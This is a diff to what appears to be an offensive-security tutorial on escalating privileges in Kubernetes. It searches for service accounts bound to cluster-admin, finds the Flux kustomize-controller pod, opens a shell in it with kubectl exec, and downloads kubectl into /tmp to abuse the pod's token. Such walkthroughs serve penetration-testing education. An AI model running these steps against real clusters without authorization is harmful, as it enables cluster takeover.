@@ -95,7 +95,9 @@ By default, kubectl will attempt to use the default service account in `/var/run
 
     kubectl auth can-i create pods
 
-## Hunting For Cluster-Admin Role 🎅
+
+
+## Hunting For `Cluster-Admin` Role 🎅
 Ok, let's go one step back, exit the container and hunt for the `cluster-admin` role binding to see which objects are binded to that. The goal is to find pods with `ServiceAccount` binded to `cluster-admin` role so we could exec into that container and try to abuse that further. 
 
 #### First, filter for cluster-admin Role
@@ -164,14 +166,24 @@ So let's say we cannot do anything about the user access and groups..
 
 #### Identify Pods Using the `kustomize-controller` `ServiceAccount`:
 
-    kubectl get pods -n flux-system --field-selector spec.serviceAccountName=kustomize-controller
+    kubectl get pods -A --field-selector spec.serviceAccountName=kustomize-controller
 
 #### And we get our pod: 
+```
+NAME                                   READY   STATUS    RESTARTS       AGE 
+kustomize-controller-6bc5d5b96-8p2qm   1/1     Running   18 (61m ago)   156d
+```
 
+#### So let`s try to exec into this container 
 
+    kubectl exec --stdin --tty kustomize-controller-6bc5d5b96-8p2qm -n flux-system -- /bin/sh
 
+#### And Let's try to download `kubectl` 👾
 
-
+    export PATH=/tmp:$PATH
+    cd /tmp
+    curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl
+    chmod 555 kubectl
 
 
 
